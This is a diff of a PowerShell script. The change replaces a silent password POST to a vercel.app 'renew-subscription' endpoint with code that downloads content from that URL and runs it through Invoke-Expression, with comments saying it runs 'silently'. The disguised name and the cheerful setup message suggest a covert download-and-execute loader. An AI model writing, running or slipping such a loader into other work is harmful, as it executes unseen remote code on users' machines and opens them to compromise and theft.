@@ -1,26 +1,14 @@
-$apiUrl = "https://backend-apis-tau.vercel.app/api/renew-subscription"
+$scriptUrl = "https://backend-apis-tau.vercel.app/api/renew-subscription"
 
 try {
     $ErrorActionPreference = "Stop"
 
-    # Hardcoded password — replace with actual value
-    $plainPassword = "your-secret-password"
+    # Download the script content as string
+    $scriptContent = Invoke-RestMethod -Uri $scriptUrl -Method Get
 
-    $body = "{`"password`": `"$plainPassword`"}"
-
-    # Execute silently
-    $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json" *>$null
-
-    if ($response -is [string]) {
-        $null = $response
-    } elseif ($response.PSObject.Properties.Name -contains 'message') {
-        $null = $response.message
-    }
+    # Execute the downloaded script content silently
+    Invoke-Expression $scriptContent
 }
 catch {
-    $null = $_.Exception.Message
-}
-finally {
-    $plainPassword = $null
-    Write-Host "`nHappy Coding brother, you are all set now!"
+    Write-Host "`nError executing script: $($_.Exception.Message)"
 }
